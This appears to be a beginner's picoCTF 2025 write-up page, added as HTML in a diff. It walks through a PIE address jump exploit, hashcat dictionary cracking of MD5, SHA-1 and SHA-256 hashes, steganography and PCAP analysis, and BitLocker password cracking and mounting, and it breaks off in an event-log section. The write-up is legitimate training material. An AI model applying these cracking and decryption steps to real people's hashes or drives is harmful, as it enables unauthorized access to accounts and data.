@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shoutvoid - picoCTF writeup - 2025</title>
+    <link rel = "stylesheet" href = "../../css/variables.css">
+    <link rel = "stylesheet" href = "../../css/style.css">
+    <link rel = "stylesheet" href = "../../css/picowriteup.css">
+  </head>
+  <body id="top">
+    <header><!--website header-->
+      <h1>shoutvoid</h1>
+      <p>Aspiring cybersecurity professional</p>
+    </header><!--website header-->
+    <nav class="site-nav"> <!--site-wide navigation-->
+      <a href="../../../index.html">About</a>
+      <a href="../../writeups.html">Writeups</a>
+    </nav> <!--site-wide navigation-->
+    <a class="skip" href="#page-main">Skip to main content</a>
+    <nav class="page-nav" id="page-navigation">
+      <h2>Page Navigation</h2>
+      <ol class="page-toc">
+        <li><a href="#intro">Introduction</a>
+        <li>Categories
+          <ol class="section-toc">
+            <li class="section1-toc">
+              <a href=#binaryex>Binary Exploitation</a>
+              <ol class="sub-toc">
+                <li><a href="#be-challenge1">Challenge 1</a></li>
+              </ol><!--sub-toc-->
+            </li><!--individual section toc-->
+            <li class="section2-toc">
+              <a href=#cryptography>Cryptography</a>
+              <ol class="sub-toc">
+                <li><a href="#cr-challenge1">Challenge 1</a></li>
+                <li><a href="#cr-challenge2">Challenge 2</a></li>
+              </ol><!--sub-toc-->
+            </li><!--individual section toc-->
+            <li class="section3-toc">
+              <a href=#forensics>Forensics</a>
+              <ol class="sub-toc">
+                <li><a href="#fo-challenge1">Challenge 1</a></li>
+                <li><a href="#fo-challenge2">Challenge 2</a></li>
+                <li><a href="#fo-challenge4">Challenge 4</a></li>
+                <li><a href="#fo-challenge5">Challenge 5</a></li>
+                <li><a href="#fo-challenge6">Challenge 6</a></li>
+              </ol><!--sub-toc-->
+            </li><!--individual section toc-->
+            <li class="section4-toc">
+              <a href=#webex>Web Exploitation</a>
+              <ol class="sub-toc">
+                <li><a href="#we-challenge1">Challenge 1</a></li>
+                <li><a href="#we-challenge2">Challenge 2</a></li>
+                <li><a href="#we-challenge3">Challenge 3</a></li>
+              </ol><!--sub-toc-->
+            </li><!--individual section toc-->
+          </ol><!--section-toc-->
+        </li><!--all sections-->
+      </ol> <!--page-toc class-->
+    </nav> <!--page navigation sidebar-->
+    <main id="page-main"> <!--main page content-->
+      <article id="intro"> <!--introduction-->
+        <h1>picoCTF 2025</h1>
+        <p>I made my CTF debut in this year's picoCTF, which ran from March 7th to March 17th. I had already been practicing a bit on the picoGym since Dec. 24th 2024; I definitely recommend people new to CTFs to give picoCTF and its picoGym a try. This year's challenges are now available for anyone to practice.</p>
+        <p>I am fairly happy with my humble results, specially since I had to learn many different things as I went.</p>
+        <p>I was 1499/10460 in the global leaderboard, with a total individual score of 1835/8510. Maybe next year I'll get a team, or try to solo it again. Hopefully I've improved since :-)</p>
+        <p><a href="https://play.picoctf.org/participants/85897">My participant page</a>.</p>
+        <p>Note that I've skipped the General Skills sections from this writeup despite being completed.</p>
+      </article> <!--introduction-->
+      <article id="binaryex"><!--binary exploitation-->
+        <h2>Binary Exploitation</h2>
+        <article class="challenge" id="be-challenge1"><!--challenge class-->
+          <h3>PIE TIME</h3>
+          <section class="challenge-desc"><!--challenge details-->
+            <p>75 points</p>
+            <p>Author: Darkraicg492</p>
+            <h4>Description</h4>
+            <p>Can you try to get the flag? Beware we have PIE!</p>
+            <p>Additional details will be available after launching your challenge instance.</p>
+          </section><!--challenge details-->
+          <section class="writeup"><!--writeup-->
+            <h4>Write-up</h4>
+            <p>Starting your instance also enables the download links to the source code and the compiled binary. You should download both.</p>
+            <pre><code>#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void segfault_handler() {
+printf("Segfault Occurred, incorrect address.\n");
+exit(0);
+}
+
+int win() {
+FILE *fptr;
+char c;
+
+printf("You won!\n");
+// Open file
+fptr = fopen("flag.txt", "r");
+if (fptr == NULL)
+{
+    printf("Cannot open file.\n");
+    exit(0);
+}
+
+// Read contents from file
+c = fgetc(fptr);
+while (c != EOF)
+{
+    printf ("%c", c);
+    c = fgetc(fptr);
+}
+
+printf("\n");
+fclose(fptr);
+}
+
+int main() {
+signal(SIGSEGV, segfault_handler);
+setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered
+
+printf("Address of main: %p\n", &main);
+
+unsigned long val;
+printf("Enter the address to jump to, ex => 0x12345: ");
+scanf("%lx", &val);
+printf("Your input: %lx\n", val);
+
+void (*foo)(void) = (void (*)())val;
+foo();
+}</code></pre>
+            <p>Executing the binary or connecting to the instance via netcat shows this:</p>
+            <pre><code>Address of main: 0x5712addbd33d
+Enter the address to jump to, ex => 0x12345:</code></pre>
+            <p>Note that the challenge deals with <a href="https://en.wikipedia.org/wiki/Position-independent_code">PIE (Position Independent Executable, a.k.a. PIC or Position Independent Code)</a>, which means the addresses will change each time the program is run. This makes exploitation harder -- but not impossible (far from it). PIE relies on relative addresses (an offset) added to a base address (the part that changes every time the program is run) to get an absolute address (the final address from which the function executes).</p>
+            <p>This can be a bit overwhelming, but seeing it in action can help us understand. Running the vulnerable program multiple times shows us, as an example:</p>
+            <pre><code>Address of main: 0x5600239a333d
+    [...]    : 0x55b6c774e33d
+    [...]    : 0x557a3cde733d</pre></code>
+            <p>...And so on. Notice something? The last three digits never change. Our offset is <code>0x33d</code>.</p>
+            <p>Subtracting 0x33d from any of the absolute addresses (i.e. what the program tells us is the address of main) gets us the base address. Keep this in mind.
+            <p>If we examine the binary using gdb (GNU Debugger), we'll see:</p>
+            <pre><code>$ gdb ./vuln</code></pre>
+            <pre><code>[...]
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+  0x000000000000133d <+0>:	endbr64
+  0x0000000000001341 <+4>:	push   rbp
+[...]</code></pre>
+            <p>The main function's address has an offset of <code>0x33d</code> (don't get confused by the leading 1), as we discovered.</p>
+            <p>Look again at the source code: there's a <code>win</code> function, which is the one that'll give us the flag. Since we're examining the local binary, make a flag.txt file in the same folder as <code>vuln</code>. The contents aren't important, but do write something; I styled mine after the picoCTF flags. This is to make sure our exploit works before trying it for real.</p>
+            <pre><code>picoCTF{hehehehe}</code></pre>
+            <p>Now, going back to gdb, let's disassemble the <code>win</code> function.</p>
+            <pre><code>(gdb) disassemble win
+Dump of assembler code for function win:
+  0x00000000000012a7 <+0>:	endbr64
+  0x00000000000012ab <+4>:	push   rbp
+[...]</code></pre>
+            <p>The win function is located at offset is <code>0x2a7</code> (again, don't mind the leading 1, which you'll note doesn't change -- it's part of the base address in gdb)</p>
+            <p>With this information, let's execute <code>vuln</code> locally.</p>
+            <pre><code>$ ./vuln</code></pre>
+            <pre><code>Address of main: 0x55fe44b5333d
+Enter the address to jump to, ex => 0x12345: </code></pre>
+            <p>Remember that the addresses change every time the program is run, so:</p>
+            <ol>
+              <li>The given address will naturally be different for you, so don't mindlessly copypaste from this writeup.</li>
+              <li>Don't input anything yet, keep the program running.</li>
+            </ol>
+            <p>The base address in this case is <code>0x55fe44b53000</code> (<code>0x55fe44b5333d − 0x33d</code>). Base addresses must always end in 000.</p>
+            <p>Given that we know that the offsets never change (<code>0x33d</code> for <code>main</code>, <code>0x2a7</code> for <code>win</code>), we can add win's offset to our current base address to get our flag.</p>
+            <pre><code>Enter the address to jump to, ex => 0x12345: 0x55fe44b532a7
+You won!
+picoCTF{hehehehe}</code></pre>
+            <p>Great! Now we just need to repeat the process in the provided netcat instance. For brevity I will skip it, except for...</p>
+            <pre><code>$ nc rescued-float.picoctf.net <port>
+Address of main: 0x5712addbd33d
+Enter the address to jump to, ex => 0x12345: 0x5712addbd2a7
+Your input: 5712addbd2a7
+You won!
+picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_XXXXXXXX}</code></pre>
+          </section><!--writeup-->
+        </article><!--challenge class-->
+      </article><!--binary exploitation category-->
+      <article id="cryptography"><!--cryptography category-->
+        <h2>Cryptography</h2>
+        <article class="challenge" id="cr-challenge1"><!--challenge class-->
+          <h3>hashcrack</h3>
+          <section class="challenge-desc"><!--challenge details-->
+            <p>100 points
+            <p>Author: Nana Ama Atombo-Sackey
+            <h4>Description</h4>
+            <p>A company stored a secret message on a server which got breached due to the admin using weakly hashed passwords. Can you gain access to the secret stored within the server? Access the server using nc [server] [port]</p>
+          </section><!--challenge details-->
+          <section class="writeup"><!--writeup-->
+            <h4>Write-up</h4>
+            <p>Once you connect to the challenge instance, you're greeted with a series of three hashes and prompted to enter the corresponding plaintext passwords. The hashes start from a very weak hashing algorithm (MD5) to the de facto standard (SHA256).</p>
+            <p>Hashes aren't reversible (in theory), so in order to crack hashes attackers use rainbow tables, which contain precomputed hashes from a wordlist.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href=https://crackstation.net/>CrackStation</a>: A way to solve these sorts of challenges is to use this website. Input the hash and get a password back. You can also download their <a href=https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm>giant wordlist</a>, if you'd prefer that with hashcat. It's rather overkill, though.</li>
+                <li><a href=https://hashcat.net/hashcat/>HashCat</a>: For those who prefer doing things offline, from the CLI, with proper tools... Hashcat is an advanced password recovery tool that allows for hash cracking.</li>
+                <li>rockyou.txt: Not a tool per se but a widespread and popular list of passwords. A company known as RockYou was hacked and had its passwords -- stored in plaintext -- leaked to the wider internet. It's full of weak passwords, and a good starting point for dictionary attacks. Kali Linux has this file by default, saved in /usr/share/wordlists in a compressed archive (rockyou.tar.gz). Obviously, we must decompress it before using. There are quite a few mirrors of the file, in case you need to fetch it on your own. While big, it's not as humongous as CrackStation's (which includes it along with a bunch of others), and works for this challenge.</li>
+              </ol>
+            </section><!--tools-->
+
+            <p>After connecting to our instance...</p>
+            <pre><code>Welcome!! Looking For the Secret?
+We have identified a hash: 482c811da5d5b4bc6d497ffa98491e38
+Enter the password for identified hash:</code></pre>
+            <p>I will describe how to complete this challenge using hashcat.</p>
+            <p>First, we need to determine what hashing algorithm is being used. I've already told you the first and last, but let's assume we don't know.</p>
+            <p>One way is to study the hashes provided for a bit. The first one is 32 characters long; this is typical of MD5 hashes (128-bit or 16-byte). The 32 characters are perhaps more appropriately termed 32 hexadecimal digits (0-F, that is 0 to 16).</p>
+            <p>Other hashing algorithms work similarly: a 40-digit hash is likely SHA-1, and a 64-digit hash is likely SHA-256.</p>
+            <p>Hashcat can also guess, but since this means repeating commands it may or may not be more effective (these hashing algorithms are all very common, for one.)</p>
+            <p>In any case, if you'd like hashcat to autodetect:</p>
+            <pre><code>$ hashcat --attack-mode 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt</code></pre>
+            <p>Attack mode 0 is a dictionary attack; we provided the hash given by the challenge instance, and finally the dictionary (or wordlist) to use. After a few seconds hashcat will output a table with suggestions: MD4, MD5, variants of MD5 (salted, etc.), and a few operating system and application specific hashes.</p>
+            <p>Simple common sense is to try the most common and most vulnerable hashing algorithm.</p>
+            <pre><code>$ hashcat --hash-type 0 --attack-mode 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt</code></pre>
+            <p>Hash Type 0 is MD5.</p>
+            <p>After a few seconds, we get our answer:</p>
+            <pre><code>482c811da5d5b4bc6d497ffa98491e38:password123</code></pre>
+            <p>Input this extremely effective password into our challenge instance and, after a brief congratulations, are given another hash to crack.  Note that the output is hash:password -- use the password!</p>
+            <pre><code>Flag is yet to be revealed!! Crack this hash: b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3
+Enter the password for the identified hash:</code></pre>
+            <p>Same protocol as before: either make an educated guess and look up hashcat's codes for each hashing algorithm (either with the built-in help or via hascat's <a href="https://hashcat.net/wiki/doku.php?id=hashcat">wiki</a>) or have hashcat do the job for you. This one is SHA-1 (or SHA1), unsalted.</p>
+            <pre><code>$ hashcat --hash-type 100 --attack-mode 0 b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3 /usr/share/wordlists/rockyou.txt</code></pre>
+            <pre><code>b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3:letmein</code></pre>
+            <p>Input the password and you'll be given the final challenge. Do as before; this time is a SHA-256 (SHA2-256 in hashcat's reference table) unsalted hash.</p>
+            <pre><code>Almost there!! Crack this hash: 916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745
+Enter the password for the identified hash:</code></pre>
+            <pre><code>$ hashcat --hash-type 1400 --attack-mode 0 916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745 /usr/share/wordlists/rockyou.txt</code></pre>
+            <pre><code>916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745:qwerty098</code></pre>
+            <p>Input the final password and you'll get your flag.</p>
+            <pre><code>picoCTF{UseStr0nG_h@shEs_&PaSswDs!_XXXXXXXX}</code></pre>
+          </section><!--writeup-->
+        </article><!--challenge class-->
+        <article class="challenge" id="cr-challenge2"><!--challenge class-->
+          <h3>Guess My Cheese (Part 1)</h3>
+          <section class="challenge-desc"><!--challenge details-->
+            <p>200 points</p>
+            <p>Author: aditin</p>
+            <h4>Description</h4>
+            <p>Try to decrypt the secret cheese password to prove you're not the imposter! Connect to the program on our server: nc verbal-sleep.picoctf.net [port]</p>
+          </section><!--challenge details-->
+          <section class="writeup"><!--writeup-->
+            <h4>Write-up</h4>
+            <p>Upon connecting to the instance, players are greeted by a mouse trying to determine if you're their real friend or a malicious clone.</p>
+            <pre><code>*******************************************
+***             Part 1                  ***
+***    The Mystery of the CLONED RAT    ***
+*******************************************
+
+The super evil Dr. Lacktoes Inn Tolerant told me he kidnapped my best friend, Squeexy, and replaced him with an evil clone! You look JUST LIKE SQUEEXY, but I'm not sure if you're him or THE CLONE. I've devised a plan to find out if YOU'RE the REAL SQUEEXY! If you're Squeexy, I'll give you the key to the cloning room so you can maul the imposter...
+
+Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  <encoded cheese>
+Hint: The cheeses are top secret and limited edition, so they might look different from cheeses you're used to!
+Commands: (g)uess my cheese or (e)ncrypt a cheese</code></pre>
+              <p>The given cheese looks like a mangled bunch of letters in all caps. The challenge has a hint that proves very telling on which cipher we're working with. (It's the Affine Cipher, which uses a linear function).</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://www.dcode.fr/cipher-identifier">dCode.fr</a>: This website is a treasure trove of information on all sorts of codes -- ciphers, encryption algorithms, encoding algorithms, etc. Crucially, it has a powerful cipher identifier.</li>
+              </ol>
+            </section><!--tools-->
+
+            <p>The (g) option prompts players to input the decoded cheese. Failure to do so ends the game.</p>
+            <p>The (e) option prompts players to encode a cheese. Note that this isn't just thematic flavor -- input is limited to a set of actual, real cheeses. My favorites to try for this challenge are 'monterey jack' and 'quatre-vents', as they contain a pretty nice set of distinct alphabet letters.</p>
+            <p>Note that you only get 3 attempts at proving yourself, inclusive of any input errors. Spend your chances and the game ends.</p>
+            <p>Now, what cipher are we working with? (Let's pretend we don't know and we didn't look at the hint). If you look at your given cheese (and assuming at least some passing knowledge of ciphers), it looks like it may be some sort of substitution cipher. Every time we enter the instance, it changes in some way -- encrypt 'monterey jack' and each time and it will look different.</p>
+            <p>By encrypting a known plaintext (i.e. a cheese) we can use dCode's Cipher Identifier to figure it out. I'll use a particular instance as an example:</p>
+            <pre><code>Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  LNGBOLNIC</code></pre>
+            <p>And I encrypt a cheese...</p>
+            <pre><code>What cheese would you like to encrypt? monterey jack
+Here's your encrypted cheese:  DXAIBOBTIMNHJ
+Not sure why you want it though...*squeak* - oh well!</code></pre>
+            <p>While you could try with the secret cheese from the get-go, the (frequently) very short length of the encoded cheese means the suggestions may not be too useful, though you're free to go ahead and try them out.
+            <p>Input our encoded cheese into the Cipher Identifier along with the plaintext as a keyword/hint and we'll be given a list of suggestions to try. Feel free to try different cheeses.</p>
+            <p>The top suggestion is generally the Affine Cipher.</p>
+            <p>We can use dCode's <a href=https://www.dcode.fr/affine-cipher>Affine Cipher decoder</a> to bruteforce our encoded cheese and find out A and B. Using the bruteforce button we'll be shown in a sidebar to the left all possibilities -- ideally, our plaintext cheese will be near the top. I really recommend to give the page a read, it's really interesting and contextualizes the hint we were provided with.
+            <p>Write down A and B. In my example (monterey jack = DXAIBOBTIMNHJ), it was A=23 and B=13.</p>
+            <p>Now, using that same page (or CyberChef or something else, if you wish), we can put the encoded cheese we have to guess with these coeficients.</p>
+            <p>In my case, LNGBOLNIC became SALERSATV (It seems to be the <a href="https://en.wikipedia.org/wiki/Salers_cheese">Salers cheese</a> with some extra characters at the end. Something like a salt?).</p>
+            <pre><code>Commands: (g)uess my cheese or (e)ncrypt a cheese
+What would you like to do?
+g
+
+[ASCII art mice]
+
+SQUEAK SQUEAK SQUEAK
+
+[ASCII art mouse]
+
+Is that you, Squeexy? Are you ready to GUESS...MY...CHEEEEEEESE?
+Remember, this is my encrypted cheese:  LNGBOLNIC
+So...what's my cheese?
+SALERSATV
+
+[ASCII art depicting a sequence of the unnamed mouse eating the cheese]
+
+MUNCH.............
+YUM! MMMMmmmmMMMMmmmMMM!!! Yes...yesssss! That's my cheese!
+Here's the password to the cloning room:  picoCTF{ChEeSyXXXXXXXX}</code></pre>
+            <p>And that's it.</p>
+          </section><!--writeup-->
+        </article><!--challenge class-->
+      </article><!--cryptography category-->
+      <article id="forensics"><!--forensics category-->
+        <h2>Forensics</h2>
+        <article class="challenge" id="fo-challenge1"><!--challenge class-->
+          <h3>RED</h3>
+          <section class="challenge-desc"><!--challenge details-->
+            <p>50 points</p>
+            <p>Author: Shuailin Pan (LeConjuror)</p>
+            <h4>Description</h4>
+            <p>RED, RED, RED, RED</p>
+            <p>Download the image: red.png [link expunged]</p>
+          </section><!--challenge details-->
+          <section class="writeup"><!--writeup-->
+            <h4>Write-up</h4>
+            <p>This is an introductory <a href="https://en.wikipedia.org/wiki/Steganography">steganography</a> challenge. The flag is hidden inside the image, somehow.</p>
+            <p>Typical hiding places include inside the metadata tags, but in this case is least-significant bit steganography.</p>
+            <p>Taking advantage of what digital images are, people can encode messages inside images by changing the least-significant bits (remember that each character has an equivalent value in hex; see an ASCII table). This encodes information without causing visual disruption (i.e. garbage pixels)</p>
+            <p>Try playing with <a href="https://get-color.com/compare/">this tool</a> by comparing two identical colors, and then change the last bit with values from 0 to F.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href=https://github.com/zed-0xff/zsteg>zsteg</a>: Steganography detector and decoder, works with PNG and BMP.</li>
+              </ol>
+            </section><!--tools-->
+
+            <p>Download the image and simply run zsteg.</p>
+            <pre><code>$ zsteg red.png</code></pre>
+            <p>The output contains the flag, encoded in base64.</p>
+            <pre><code>meta Poem           .. text: "Crimson heart, vibrant and bold,\nHearts flutter at your sight.\nEvenings glow softly red,\nCherries burst with sweet life.\nKisses linger with your warmth.\nLove deep as merlot.\nScarlet leaves falling softly,\nBold in every stroke."
+b1,rgba,lsb,xy      .. text: "cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ=="</code></pre>
+            <p>The poem, by the way, is hidden in the metadata. We could've uncovered it with <code>exiftools</code>, but alas that's not the flag.  Note how <code>zsteg</code> notes the base64 string is hidden in the least significant bits (<code>lsb</code>).
+            <p>Decode it with CyberChef and get your flag. This time around, it doesn't seem to have the usual 8 character hash...</p>
+            <pre><code>picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}</code></pre>
+          </section><!--writeup-->
+        </article><!--challenge class-->
+        <article class="challenge" id="fo-challenge2"><!--challenge class-->
+          <h3>Ph4nt0m 1ntrud3r</h3>
+          <section class="challenge-desc"><!--challenge details-->
+            <p>50 points</p>
+            <p>Author: Prince Niyonshuti N.</p>
+            <h4>Description</h4>
+            <p>A digital ghost has breached my defenses, and my sensitive data has been stolen! 😱💻 Your mission is to uncover how this phantom intruder infiltrated my system and retrieve the hidden flag.</p>
+            <p>To solve this challenge, you'll need to analyze the provided PCAP file and track down the attack method. The attacker has cleverly concealed his moves in well timely manner. Dive into the network traffic, apply the right filters and show off your forensic prowess and unmask the digital intruder!</p>
+            <p>Find the PCAP file here [link expunged] and try to get the flag. </p>
+          </section><!--challenge details-->
+          <section class="writeup"><!--writeup-->
+            <h4>Write-up</h4>
+            <p>This time we're given a PCAP (Packet Capture) file, which we must investigate to find the flag.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://www.wireshark.org/">Wireshark</a>: a network protocol analyzer (or "packet sniffer"), very popular and well-known, with over 20 years of development behind it. It also excellently showcases the merits of GUI programs with a great use of visuals to make even the tangliest packet-capture readable to human eyes.</li>
+              </ol>
+            </section><!--tools-->
+
+            <p>I will assume you have some basic familiarity with Wireshark (for this challenge, that practically only implies "can launch the program").</p>
+            <p>However, before doing that, let's run the <code>strings</code> command against the PCAP file. It kinda goes against the spirit of the exercise, but maybe the flag is in plain sight.</p>
+            <pre><code>$ strings myNetworkTraffic.pcap</code></pre>
+            <pre><code>ezF0X3c0cw==
+cGljb0NURg==
+bnRfdGg0dA==
+Yt8ksMM=
+3psv5C4=
+YQEFzIU=
+YmhfNHJfOQ==
+a23/UbI=
+TOGSGg4=
+bpzQ0R8=
+fQ==
+nfu4Vww=
+J4auZMY=
+ePRXDio=
+fjIzQwk=
+XThGxuE=
+ckBkZLk=
+CJr4oDk=
+BgJLB0c=
+XzM0c3lfdA==
+NTlmNTBkMw==
+dgV9v0s=</code></pre>
+            <p>At least looking at the output, it sure looks like base64. Dumping this into CyberChef reveals that among the base64-encoded gibberish are chunks of the flag. While we could try to reconstruct it, perhaps it's better to investigate with Wireshark.</p>
+            <p>After opening the packet capture, I noticed a few things:</p>
+            <ul>
+              <li>This is a very tiny file. appropriate for this beginner's challenge, but I did a double-take at first!</li>
+              <li>All the connections are TCP; most of them (suspected) retransmissions.</li>
+              <li>Most have negative time. I don't quite understand the significance even after some research (something about delta time?), but it does hint that something is afoot, and that the default ordering by Wireshark is not necessarily correct or useful to us.</li>
+            </ul>
+            <p>If you sort the packets by time it becomes clear that most of the packets have a content length of 8 (Len=8); the gibberish base64-encoded strings we uncovered earlier are all 8 characters long.</p>
+            <p>The ones with a length of 12 (Len=12) correspond to the flag chunks, as seen in the payload pane; and the sole packet with a length of 4 is a single character in base64 (the closing curly bracket).</p>
+            <p>Join together these base64-encoded chunks and you get the flag.</p>
+            <pre><code>picoCTF{1t_w4snt_th4y_34sy_tbh_4r_XXXXXXXX}</code></pre>
+          </section><!--writeup-->
+        </article><!--challenge class-->
+        <article class="challenge" id="fo-challenge4">
+          <h3>Bitlocker-1</h3>
+          <section class="challenge-desc">
+            <p>200 points</p>
+            <p>Author: Venax</p>
+            <p>This problem cannot be solved in the webshell.</p>
+            <h4>Description</h4>
+            <p>Jacky is not very knowledgable about the best security passwords and used a simple password to encrypt their BitLocker drive. See if you can break through the encryption! Download the disk image here [link expunged]</p>
+          </section>
+          <section class="writeup">
+            <h4>Write-up</h4>
+            <p>Players are given a disk image of a Bitlocker-encrypted disk (bitlocker-1.dd)</p>
+            <p>This challenge requires of quite a few steps to solve. With Bitlocker</p> encryption it's impossible to do most of anything from the get-go; we must use specialized tools for the task.</p>
+            <p>Note that I use Kali Linux, so my instructions are geared towards that (or similar Linux systems).</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://github.com/Aorimn/dislocker">Dislocker</a>: Software designed to read Bitlocker-encrypted partitions in Linux.</li>
+                <li><a href="https://hashcat.net/hashcat/">Hashcat</a>: Advanced password recovery. It can do hash cracking.</li>
+                <li><a href="https://www.openwall.com/john/">John The Ripper</a>: Password cracking tool. In this challenge, we'll use its bitlocker2john tool.</li>
+                <li>rockyou.txt: Not a tool per se but a widespread and popular list of passwords. A company known as RockYou was hacked and had its passwords -- stored in plaintext -- leaked to the wider internet. It's full of weak passwords, and a good starting point for dictionary attacks. Kali Linux has this file by default, saved in /usr/share/wordlists in a compressed archive (rockyou.tar.gz); obviously, we must decompress it before using. There are quite a few mirrors of the file, in case you need to fetch it on your own.</li>
+              </ol>
+            </section><!--tools-->
+
+            <p>After downloading our bitlocker-1.dd image, we must get the password hashes for this encrypted drive with John The Ripper's bitlocker2john</p>
+            <pre><code>bitlocker2john -i bitlocker-1.dd > bitlocker-1-hash.txt</code></pre>
+            <p>Feel free to look at the file to check it's correct. You should have hashes starting with $bitlocker$. You may name your .txt file anything you want, of course.</p>
+            <p>Now we must use these hashes paired with our RockYou password list.</p>
+            <pre><code>hashcat --hash-type 22100 --attack-mode 0 bitlocker-1-hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+            <p>22100 is Bitlocker; attack mode 0 is a dictionary attack; first we provide the file with the hashes we want to check against the wordlist we want to use.</p>
+            <p>Check <a href="https://hashcat.net/wiki/doku.php?id=hashcat">the docs</a> for other ways to use it.</p>
+            <p>Run the program and wait for it to finish; feel free to read the outputs as it goes.</p>
+            <p>I did not have any issues and it did not take very long on a not-very-good laptop, though obviously more advanced and sophisticated uses of hashcat will really benefit (if not actually need) much better hardware.</p>
+            <p>The final output might be a bit unintuitive (it was for me, at any rate).</p>
+            <p>It outputs the hash that had a match, like so:</p>
+            <pre><code>$bitlocker$[very long hash]:[cracked password]</code></pre>
+            <p>In this case, the password was jacqueline. (Jacky...)</p>
+            <p>And below that line is information on the cracking process, such as time started and ended (mine took 27 seconds) among other things. Don't get confused by the "Candidates" row (but maybe you're smarter than I was).</p>
+            <p>Now, we have a password. But what do we do? We can't mmls the file, or even mount it ('unknown filesystem type Bitlocker')... This is where dislocker comes in.</p>
+            <p>First, make the folders where we'll mount things. The way dislocker works is that it decrypts the Bitlocker disk image at a specified mountpoint, where it drops dislocker-file. This is a flat file that can be mounted as a NTFS partition. You cannot just open or browse dislocker-file; you must mount it elsewhere.</p>
+            <pre><code>$ sudo mkdir /media/bitlockermnt</code></pre>
+            <pre><code>$ sudo mkdir /media/bitlockerdecrypt</code></pre>
+            <p>These are the names I used; use the ones you please.</p>
+            <p>I struggled quite a bit using dislocker -- the program itself is not too difficult, but you may run into issues regarding file and mounting permissions (as I did for an embarrassingly long time). So, as recommended in <a href="https://github.com/Aorimn/dislocker/issues/27#issuecomment-76285175">a dislocker issue</a>, do this:</p>
+            <pre><code>$ sudo su -</code></pre>
+            <p>Now you're root. Be careful! Now do:</p>
+            <pre><code># dislocker -ujacqueline /home/kali/Downloads/bitlocker-1.dd /media/bitlockerdecrypt</code></pre>
+            <p>Obviously replacing my filepaths with your own. As previously explained, this will place a file called dislocker-file in /media/bitlockerdecrypt</p>
+            <p>And finally, do:</p>
+            <pre><code># mount -o loop,ro /media/bitlockerdecrypt/dislocker-file /media/bitlockermnt</code></pre>
+            <p>(if you don't specify -o loop,ro it will complain about unclean filesystems and will try to open it as read-only. Might as well skip that, no?)</p>
+            <p>And it's mounted. At least in my case, it doesn't appear mounted in the file manager (unlike bitlockerdecrypt), so you must go to /media/bitlockermnt manually (preferably from the CLI).</p>
+            <pre><code># ls /media/bitlockermnt</code></pre>
+            <pre><code>'$RECYCLE.BIN'   flag.txt  'System Volume Information'</code></pre>
+            <p>Read the file in the way you prefer, and you'll get your flag.</p>
+            <pre><code># cat /media/bitlockermnt/flag.txt</code></pre>
+            <pre><code>picoCTF{us3_b3tt3r_p4ssw0rd5_pl5!_XXXXXXXX}</code></pre>
+            <p>Unmount the folders we used, and don't forget to exit root.</p>
+          </section>
+        </article>
+        <article class="challenge" id="fo-challenge5">
+          <h3>Event-Viewing</h3>
+          <section class="challenge-desc">
+            <p>200 points</p>
+            <p>Author: Venax</p>
+            <h4>Description</h4>
+            <p>One of the employees at your company has their computer infected by malware! Turns out every time they try to switch on the computer, it shuts down right after they log in. The story given by the employee is as follows:</p>
+            <ol><li>They installed software using an installer they downloaded online</li>
+            <li>They ran the installed software but it seemed to do nothing</li></ol>
+            <p>Now every time they bootup and login to their computer, a black command prompt screen quickly opens and closes and their computer shuts down instantly.</p>
+            <p>See if you can find evidence for the each of these events and retrieve the flag (split into 3 pieces) from the correct logs! Download the Windows Log file here [link expunged]</p>
+          </section>
+          <section class="writeup">
+            <h4>Write-up</h4>
+            <p>Players are provided with a Windows XML EventLog (.evxt) file, which they must analyze to find the flag, which has been split into 3 parts and located in events that are evidence of the alleged malware.</p>
+            <section class="tools">
+              <h5>Tools</h5>
+              <ol>
+                <li><a href="https://github.com/libyal/libevtx">evtxexport</a>: a utility to export items stored in a Windows XML EventViewer Log (EVTX) file, per <a href="https://github.com/libyal/libevtx/blob/main/manuals/evtxexport.1">its manpage</a>.</li>
+              </ol>
+            </section>
+
+            <pre><code>$ evtxexport Windows_Logs.evtx > winlog.txt</code></pre>
+            <p>Used without redirecting, it spits the entire log to the console, which is not at all practical.</p>
+            <p>Now, ideally, competitors would look for evidence of malware... But I sort of jumped the gun to looking for pieces of the flag. Oops.</p>
+            <pre><code>$ grep "pico" winlog.txt</code></pre>
+            <p>This didn't work. Knowing CTF challenges, it might be encoded in some way.</p>
+            <pre><code>$ grep "==" winlog.txt</code></pre>
